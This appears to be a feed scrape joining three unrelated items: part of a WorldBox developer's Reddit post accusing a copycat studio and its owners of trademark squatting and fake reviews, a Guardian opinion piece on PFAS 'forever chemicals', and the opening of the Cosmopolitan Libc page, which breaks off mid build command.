&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Then you check their other products... a minecraft mod for which you pay $9.99 per week. Rings a bell? Mhm.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;&lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Business model: match.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Then you check their website, their privacy policy - same structure as the other few companies you already connected to the 🕴️suit. They even have the same mistakes in the shared privacy policies - copy/paste errors.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;&lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Marketing materials: match.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;So while they were still &quot;negotiating&quot; with you, they already created a new company in February with the purpose of launching a competing copy-cat game. And steal your trademark from under your nose.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Does that sound like trust-worthy business partners?&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;You could say I dodged a bullet there…&lt;/p&gt;
&lt;p&gt;Their main money maker&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;If we look at their &quot;product&quot; which he was very proud about - let's analyze it. It's called &quot;&lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Raft Survival : Ocean Nomad&lt;/strong&gt;&quot;. The surprising thing about it is that it uses the name &quot;Raft&quot; in the title. But it's not affiliated with the popular Steam game &quot;Raft&quot; that was launched in 2017.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;How come? How come a copycat can use the name of the original game?&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;You guessed it... trademarks.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Around the time the first Raft steam trailer was released, somebody filed for a trademark for the name &quot;Raft&quot;. Used exclusively for mobile games.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Most likely the main developers didn't notice it - I mean who checks these things constantly? They were focusing on the desktop version - it takes all your attention.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;And who filed for the trademark? None other than our dear Mr. 🕴️Suit : &lt;a href=&quot;https://uspto.report/TM/87605582&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;https://uspto.report/TM/87605582&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;We found a pattern.&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;They look out for interesting and simple game ideas to copy, and then they blindside the ( often inexperienced ) indie developers by making a publishing a very simple copy-cat version, and then quietly filing a trademark for that name.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;That way they can use the wording in advertisements, on the app stores, etc. They could even take down the original games based on this!&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;So they are taking advantage of a good name you build up with your sweat and tears, and they’ll just blatantly use it to destroy the joy of gamers who expected to play your game. Instead they get a really bad copy and are tricked out of their money.&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;What’s the copy game about?&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;It’s a simple version of WorldBox. All sprites are either similar, or changed from the original game. Some sprites are even stolen from MineCraft ( owned by Microsoft ).&lt;/p&gt;

&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;The game itself has the name “worldbox” in the id, which is a clear trademark infringement. ( Trademarks don’t have to be registered for them to be valid. )&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;It also links to facebook, vk ( russian facebook ), and other social media pages which have “worldbox” in the name, or “worldbox_god_simulator” in the url.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;E.g. the VK.ru page is called “WorldBox God Simulator” :&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;All of them seem to have been deleted in the past few days. But the game remains up.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Some comparisons : ( Left is the original, right is the copy )&lt;/p&gt;

&lt;/div&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;At the launch of the game it was filled with a lot of 5 star reviews. These were very simple, with messages like “Good application, very good for first download”.&lt;/p&gt;

&lt;div class=&quot;_2-UiOdhyj4wHBv7Rc2FeDr&quot;&gt;

&lt;/div&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Which &lt;a href=&quot;https://www.reddit.com/r/Worldbox/comments/jgf45p/i_discovered_that_the_god_simulator_he_continues/&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;many&lt;/a&gt; people thought to be &lt;a href=&quot;https://www.reddit.com/r/Worldbox/comments/jfnqfq/the_knockoffs_reviews_are_going_up_for_some_reason/&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;fakes&lt;/a&gt; used to artificially increase ratings.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;The Worldbox community also found out about the trademarks as well, and started discussing it on &lt;a href=&quot;https://www.reddit.com/r/Worldbox/comments/jbk3d6/i_did_some_research_on_the_makers_of_the_worldbox/&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;reddit&lt;/a&gt;, and a few youtubers even made &lt;a href=&quot;https://www.youtube.com/watch?v=Dx3E-qO1uk0&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;videos&lt;/a&gt; with the hashtag #saveWorldbox to show their support.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;They also left hundreds of reviews to the product from STAVRIO LTD, which received “interesting” replies considering the whole situation :&lt;/p&gt;

&lt;div class=&quot;_2-UiOdhyj4wHBv7Rc2FeDr&quot;&gt;
&lt;div class=&quot;_3Oa0THmZ3f5iZXAQ0hBJ0k _2LjgQiHLCZ9LDbCQx5KaOi&quot;&gt;&lt;a href=&quot;https://preview.redd.it/1zesuk1668x51.png?width=496&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=4e4d51dd06f51f5b95344cf444ef94a1660a538a&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img alt=&quot;r/Worldbox - The fight for WorldBox, or how a game you worked on for 8 years may be stolen from you without you even knowing it&quot; class=&quot;_2_tDEnGMLxpM6uOa2kaDB3 ImageBox-image media-element _1XWObl-3b9tPy64oaG6fax&quot; src=&quot;https://preview.redd.it/1zesuk1668x51.png?width=496&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=4e4d51dd06f51f5b95344cf444ef94a1660a538a&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Too bad reviews only sting a little.&lt;/p&gt;
&lt;p&gt;This is still happening&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Since I was first informed about this they filed even more trademarks for WorldBox. In the EU, in Australia, Canada, S.Korea and other countries. There are many filed trademarks pending in many jurisdictions.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;They are also filing for even more trademarks in other jurisdictions for the “Raft” trademark - at the same time.&lt;/p&gt;
&lt;p&gt;Community response&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;It was great to see how the community dug up all of this, and went decidedly against the copycat. While I couldn’t talk with people - since I’m talking with lawyers currently - people took things into their own hands. They did research, they even examined the copy’s game assets. They rated the game based on their feelings.&lt;/p&gt;

&lt;div class=&quot;_2-UiOdhyj4wHBv7Rc2FeDr&quot;&gt;
&lt;div class=&quot;_3Oa0THmZ3f5iZXAQ0hBJ0k _2LjgQiHLCZ9LDbCQx5KaOi&quot;&gt;&lt;a href=&quot;https://preview.redd.it/akq3p5o768x51.png?width=1360&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=3d6de49df400614dbe29160f7e1a5168561021af&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img alt=&quot;r/Worldbox - The fight for WorldBox, or how a game you worked on for 8 years may be stolen from you without you even knowing it&quot; class=&quot;_2_tDEnGMLxpM6uOa2kaDB3 ImageBox-image media-element _1XWObl-3b9tPy64oaG6fax&quot; src=&quot;https://preview.redd.it/akq3p5o768x51.png?width=1360&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=3d6de49df400614dbe29160f7e1a5168561021af&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;And it has been important. It still is. With over 5 trademarks being filed by the copycats the future is uncertain.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;The community based #saveworldbox was the right reaction - I'm really proud of the community here for having found these things out and started a process against it! It seems so far these guys have been getting away with it because nobody really &lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;cared&lt;/em&gt; that they are behaving unethically.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;For me the battle is far from over and I appreciate all of the support we can get. Be it videos or posts, or spreading awareness. It’s &lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;not ok&lt;/em&gt; to attempt to steal somebody’s hard work like this.&lt;/p&gt;
&lt;p&gt;My goals&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;What is my goal in all of this?&lt;/p&gt;
&lt;ol class=&quot;_1eJr7K139jnMstd4HajqYP&quot;&gt;&lt;li class=&quot;_3gqTEjt4x9UIIpWiro7YXz&quot;&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Protect WorldBox&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Protect WorldBox, since it’s my life’s work. I’ve been working for over 8 years on this, and if a copy cat wants to make a game - they can make their own name and work on that; instead of trying to mislead users that want to play the real WorldBox.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;2. &lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Warn other indie devs&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Put attention on these business practices, so other indie developers understand how important filing a trademark early on is. It’s actually relatively cheap as well.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;3. &lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Highlight app store abuse&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Showcase a net of malicious firms that abuse the Apple Appstore and Google Play store in many ways. Show how they are connected, and how they circumvent the rules and TOS that count for other developers.&lt;/p&gt;

&lt;div class=&quot;_2-UiOdhyj4wHBv7Rc2FeDr&quot;&gt;
&lt;div class=&quot;_3Oa0THmZ3f5iZXAQ0hBJ0k _2LjgQiHLCZ9LDbCQx5KaOi&quot;&gt;&lt;a href=&quot;https://preview.redd.it/aaksa0u868x51.png?width=700&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=73fb717e2605893261865bf90e61752188e33165&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img alt=&quot;r/Worldbox - The fight for WorldBox, or how a game you worked on for 8 years may be stolen from you without you even knowing it&quot; class=&quot;_2_tDEnGMLxpM6uOa2kaDB3 ImageBox-image media-element _1XWObl-3b9tPy64oaG6fax&quot; src=&quot;https://preview.redd.it/aaksa0u868x51.png?width=700&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=73fb717e2605893261865bf90e61752188e33165&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Hopefully get the app stores to put a stop to these malicious actors, and stop their bad business practices. These apps are deceiving to app store customers and leave everybody with a bad experience.&lt;/p&gt;
&lt;p&gt;Next steps&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;In our case I’ve sat down with my lawyers, and we have started a process to protect WorldBox. It’s time intensive, and my biggest worry is that it affects future updates. But I trust in the talented lawyer teams to create a case against these firms and to protect WorldBox at all costs.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;That involves a lot of things, even speaking to people who were previously involved with these firms, etc. It’s going to take some time.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;This post is also a big warning to other aspiring indie devs, and what to watch out for.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;This has been a very time consuming October, and already now the next patch has been delayed due to this - for this I have to apologize to the community. Now if you’ll excuse me, I have to get back to finishing boats, sigh.&lt;/p&gt;
&lt;p&gt;Appendix: A web of companies&lt;/p&gt;
&lt;p&gt;Who are all these people and companies? ( all this is information is public knowledge, that you can research yourself )&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;The main firm ( JustMoby ) is owned by 🕴️ Alexander Novikov. That was the man I met at the games conference. His business card mentions that he’s an “investor”.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Another owner of JustMoby is 🇷🇺 Egor Agafonov - he is also in the company registry one of the owners of STAVRIO LTD. The company behind the worldbox copycat.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;And finally 🇧🇾 Eugene Kluchinski is also an owner of most of the firms. He’s listed on LinkedIn as CEO of JustMoby LTD. Companies house attributes him a majority of shares in terms of voting rights.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Most of the firms have one of these 3 people directly involved. They have a lot of shell companies registered - most of the firms seem to have a holding firm in 🇪🇪 Estonia, and a LTD in the 🇬🇧 UK. Some are listed at the same address as STAVRIO LTD.&lt;/p&gt;

&lt;/div&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Most of the estonian companies share the same registration email, have been filed with the same lawyer firm, but only differ in who the registered director is.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;It’s important to understand that a company registration doesn’t require people to be present in the office. So you can easily have a dev team in Russia under one company, and then you can just open up 10 different companies at some PO box in the UK or Estonia to publish them.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;So if Apple’s AppStore team decides to take down your app or account because too many customers had a bad experience and complained ( e.g. if they unknowingly get charged $9.99 per week for some copycat game ), then now they can ( although it’s against apple TOS ) move their app to some other firm you registered, and republish there under a slightly different name. And the cycle of fake reviews and scammed customers begins again.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Let’s just say that a net of shell companies is normally not required if you look at the most successful game developers. And it reeks of very dubious business practices.&lt;/p&gt;
&lt;p&gt;Hostile work environment?&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Many &lt;a href=&quot;https://neorabote.net/feedback/list/company/133441&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;ex-employees&lt;/a&gt; &lt;a href=&quot;https://antijob.net/black_list/ooo__sonakay___ooo__dzhigso_pazls___unisoft_games_tolyatti__gomel__s_pb/&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;mentioned&lt;/a&gt; &lt;a href=&quot;https://antijob.net/black_list/id117117&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;publicly&lt;/a&gt; that the company seems to prefer copyright infringements, dubious pricing practices and is used to having their accounts taken down from app-stores due to many policy violations. The reviews in Russian, but you can use google translate to understand it. To one of reviews A.Novikov replied directly.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;From the reviews we can see that the sad part seems to be that the development team seems to have talented and underpaid members; which seem to detest the owners/managers. But ultimately it’s the leadership - the owners - of these companies that count here.&lt;/p&gt;
&lt;p&gt;Tip of the ice-berg&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;After reading the reviews from past employees, it becomes more clear why there is a big net of company registrations which re-publish the same apps. It seems they simply create more and more firms to re-publish the apps again and again; or to mitigate the risk when one of them gets taken down.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Because for example Redbeet Interactive ( the makers of the original Raft game ) would sue them, then they just have to close a subsidiary. If we also would sue them successfully, they’d also just have to close a subsidiary. At least that’s most likely their thinking.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;But the main hustle would still be on - they’d just pop up a few more companies and publish clones there again. And keep continuing with their trial and error approach until one of them gets enough downloads / subscriptions. Unless Apple and Google step in and identify that all of them are connected, and take them down at the same time.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Also it seems that they have established a practice where they automatically give their apps fake reviews over time. It’s interesting that neither Google Play nor the Appstore have detected this and flagged them for this.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Redbeat Interactive developers &lt;a href=&quot;https://steamcommunity.com/app/648800/discussions/0/1643166649104433378/&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;aware of Ocean Nomad&lt;/a&gt; and has been dealing with them for a while now.

&lt;/div&gt;
&lt;p&gt;Appendix: Comment from Lawyer&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;Our usual advice in such situations is to register trademarks once your app starts getting popular and register it in all main jurisdictions where most users or money come from. With a trademark it's easier to ban &quot;clone games&quot; and bring cases to courts, but if you register only the name of the game, this may not guarantee characters and gameplay won’t be copied and used, but under a different name.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;But it is possible and necessary to act by a combination of legal and non-legal methods. Track all activity of the clone app, find it in all app markets, all social networks and all marketing materials. Begin actively filing complaints asking you to remove controversial content with a link to your copyright. This can work, especially given the stringency of US copyright laws (specifically the DMCA). In the case of the Worldbox game, the similarity of the gameplay is obvious, I think, to everyone. Therefore, marketplaces are likely to side with the original game.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;In this case, a competitor registers trademarks to use the Worldbox name in the main jurisdictions. But in almost all countries there is an opposition and objection procedure, and by attaching proof of the originality of the application and the date of its creation, much ahead of the appearance of a new game, there is every chance to cancel these applications and register your own.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;By the way, the very fact that a competitor registers exactly the word Worldbox is already suspicious: why register the name of someone else's game when yours is called &quot;God Simulator&quot;?&lt;/em&gt;&lt;/p&gt;

<title>Chemicals called PFAS and PFOS are in the blood of virtually every person</title>
<link>https://www.theguardian.com/commentisfree/2020/dec/17/dark-waters-pfas-ticking-chemical-time-bomb-in-your-blood</link>
<guid isPermaLink="true" >https://www.theguardian.com/commentisfree/2020/dec/17/dark-waters-pfas-ticking-chemical-time-bomb-in-your-blood</guid>
<description>&lt;p class=&quot;css-38z03z&quot;&gt;&lt;span class=&quot;css-1r9pv9q&quot;&gt;&lt;span class=&quot;css-1ac5g5w&quot;&gt;I&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;css-38z03z&quot;&gt;magine that a small group of people coordinated the intentional manufacture and release of a lethal poison – and imagine they knew this poison had special properties that meant, once released into the world, it would be inevitable that it would make its way into the blood of virtually every person on the planet, even babies in their mother’s womb, and stay there, like a ticking time bomb.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;Well, that “ticking time bomb” waiting to explode into serious, even fatal, disease is not a fictional device from some doomsday thriller; it is real, it is inside virtually all of us, right now. &lt;em&gt;Tick, tick, tick&lt;/em&gt;.&lt;/p&gt;

&lt;p class=&quot;css-38z03z&quot;&gt;And we know exactly who is responsible. For a long time, powerful corporate interests succeeded in keeping this heinous, brazen, and ongoing public health threat hidden from regulators, from scientists, and from the public. But it is now a matter of public record that these people knew the potential for harm and grave threat to human life, and continued anyway.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;The only reason the world knows anything about this today is because, in 1998, Earl Tennant, a courageous farmer from West Virginia, came to me demanding answers. His cattle were dying in droves and he was certain the trouble stemmed from the white foaming crud defiling his creek where his cattle drank. Something was efficiently killing off not only his cattle but also the deer and other wildlife. Earl wanted answers and I wanted to help him. Neither of us could have fathomed just how bad or how deep this really went.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;Getting the answers required over two decades of litigation, continuing to this day. But like the cattle and other animals on his farm, Earl would not survive long enough to get all his answers. The dark secrets deliberately withheld from Earl about his creek and his dying cows, went far beyond his property line. The poison flowing into Earl’s creek was also leaching into the drinking water of 70,000 of his neighbors, but no one was being told a thing. And this was just the tip of the iceberg. In secret, the poison had in fact streamed all across the country, and into the bloodstreams of virtually every American.&lt;/p&gt;
&lt;aside class=&quot;css-z92kdy&quot; readability=&quot;1.5&quot;&gt;&lt;blockquote class=&quot;css-6n7j50&quot; readability=&quot;6&quot;&gt;
&lt;p&gt;Studies are now raising concerns that some of these forever chemicals may negatively impact our immune system – and possibly even the efficacy of vaccines&lt;/p&gt;
&lt;/blockquote&gt;
&lt;footer/&gt;&lt;/aside&gt;&lt;p class=&quot;css-38z03z&quot;&gt;This man-made poison, called PFOA, brought us the magic of Teflon, the convenience of non-stick, and an array of stain and water-resistant products that revolutionized our homes and our lives forever. Internally, top company scientists had been studying its toxicity for decades. And there had been alarm bells after alarm bells: cancer in lab animals; cancer in exposed workers; birth deformities in offspring of exposed lab animals – even, unconscionably, in babies of exposed workers. The unique properties of PFOA, and its close chemical cousin, PFOS (used in an equally dizzying assortment of products, from Scotchgard to certain firefighting foams) make them incredibly persistent: they last for an unusually long time in our bloodstreams, where they accumulate. And they last virtually forever in our environment. That’s why they are dubbed “forever chemicals”.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;And the effects of this poison coursing through our veins can be devastating and wide-ranging. Scientists have confirmed links between PFOA exposure and a variety of serious diseases, including kidney cancer, testicular cancer, ulcerative colitis, thyroid disease, and pregnancy-induced hypertension. And more recent studies are now raising concerns that some of these forever chemicals may negatively impact our endocrine system, our fertility, and our immune system – and possibly even the efficacy of vaccines. Frightening news, indeed, when we are all trying to fight off a worldwide pandemic and need our vaccines to be as effective as possible.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;It took years for me to pull on the threads that would eventually unspool all the secrets. Frankly, I was shaken to the core by what was exposed, yet I understood why the stakes were sky high for those seeking to hide the truth. Why it was a fight to the death to keep a lid on their secrets – and equally high stakes for those who had jumped into their deep pockets. Still, the truth won out.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;So now, as we struggle to live through a once-in-a-century pandemic, there is, in fact, another global public health threat bearing down upon all of us, though few know of it or realize its risk. And this threat, unlike Covid-19, is of a scope and scale without precedent in human history.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;Those who have learned about this other, still obscure health threat (the poisoning, not the virus) and who comprehend the urgency, all ask me the same question: how is it that almost all of us have this poison in our blood, and it is still not a world-wide story – and how is it possible that the companies who did this are not being held responsible? This is a question I cannot answer.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;Why is a nation and a world so outraged by lead in the water of Flint taking this one lying down? This is poisoning not only the drinking water in one American city, but countless cities all over the world – and the ground water, surface waters, soils, and vegetation. It’s a poison that can last forever in our environment and is now circulating in the blood of almost every human and living creature on the planet, for this generation and generations to come. Unless we act. Quickly, and decisively.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;We have seen through Covid-19 that wartime-style mobilization, huge in scope and scale, can be mounted against a mortal threat to the population. We have seen with our own eyes that this is possible. We must come together to shine our best science and leadership to learn and address the full extent of the threat to us and the damage to our environment and health posed by forever chemicals. And stop it – now.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;Who should foot the bill for all of it? The companies who have been reaping billions in profits each year, for decades, from making and unleashing this lethal poison into the world, all the while knowing the grave health threat it posed to us and our children – but chose not to tell us.&lt;/p&gt;
&lt;p class=&quot;css-38z03z&quot;&gt;Let us hold them accountable. These companies need to own up to what they have done and make it right. We must demand it. And we have the power and moral responsibility to make sure it happens, because our very lives depend on it, and for the sake of the entire planet – and everyone’s future.&lt;/p&gt;

<title>Cosmopolitan Libc: build-once run-anywhere C library</title>

<guid isPermaLink="true" >https://justine.lol/cosmopolitan/index.html</guid>
<description>&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;title&gt;Cosmopolitan C Library&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=1024&quot;/&gt;&lt;link rel=&quot;canonical&quot; href=&quot;https://justine.lol/cosmopolitan/index.html&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.googleapis.com/css2?family=Roboto&amp;amp;display=swap&quot; type=&quot;text/css&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; type=&quot;text/css&quot;/&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;176.3797979798&quot;&gt;
&lt;header&gt;&lt;img width=&quot;196&quot; height=&quot;105&quot; src=&quot;https://storage.googleapis.com/justine/cosmopolitan/cosmopolitan.png&quot; title=&quot;cosmopolitan honeybadger&quot; alt=&quot;honeybadger&quot;/&gt;
&lt;span&gt;build-once run-anywhere c without devops&lt;/span&gt;&lt;/header&gt;&lt;nav class=&quot;nav&quot;/&gt;&lt;p&gt;Cosmopolitan makes C a build-once run-anywhere language, similar to Java, except it doesn't require interpreters or virtual machines be installed beforehand. Cosmo provides the same portability benefits as high-level languages like Go and Rust, but it doesn't invent a new language and you won't need to configure a CI system to build separate binaries for each operating system. What Cosmopolitan focuses on is fixing C by decoupling it from platforms, so it can be pleasant to use for writing small unix programs that are easily distributed to a much broader audience.&lt;/p&gt;
&lt;h3&gt;Getting Started&lt;/h3&gt;
&lt;p&gt;Assuming you have GCC on Linux, then all you need are the five additional files which are linked below:&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;com&quot;&gt;# create simple c program on command line&lt;/span&gt;
echo &lt;span class=&quot;str&quot;&gt;'
  main() {
    printf(&quot;hello world\n&quot;);
  }
'&lt;/span&gt; &amp;gt;hello.c

&lt;span class=&quot;com&quot;&gt;# run gcc compiler in freestanding mode&lt;/span&gt;
gcc -g -Os -static -fno-pie -mno-red-zone -nostdlib -nostdinc -o hello.com hello.c \
  -Wl,--oformat=binary -Wl,--gc-sections -Wl,-z,max-page-size=0x1000 \
